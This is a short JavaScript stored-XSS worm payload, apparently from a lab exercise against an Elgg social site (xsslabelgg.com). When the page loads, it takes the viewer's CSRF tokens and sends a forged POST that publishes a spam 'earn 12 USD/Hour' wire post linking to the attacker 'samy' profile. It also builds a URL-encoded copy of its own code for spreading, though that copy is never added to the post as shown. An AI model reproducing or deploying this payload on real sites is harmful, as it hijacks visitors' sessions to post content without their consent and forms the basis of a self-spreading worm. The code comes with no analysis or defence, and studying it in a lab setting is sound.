<script  id="worm" type="text/javascript">
	window.onload = function(){
        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

        //We've gathered the sendUrl from the wire page where user can post
        //In the post body there is only one key named body .We've set the 
        //target message in the body
        
		var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token = "&__elgg_token="+elgg.security.token.__elgg_token;
        var str = "link";
        var result = "http://www.xsslabelgg.com/profile/samy";
		var body = "&body=To earn 12 USD/Hour(!), visit now "+result ;
        
		var sendurl = "http://www.xsslabelgg.com/action/thewire/add";
		var content = token + ts  +body   ;
		if(elgg.session.user.guid != 47)
		{
            //we've checked if the user is samy or not
            console.log('post done');
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>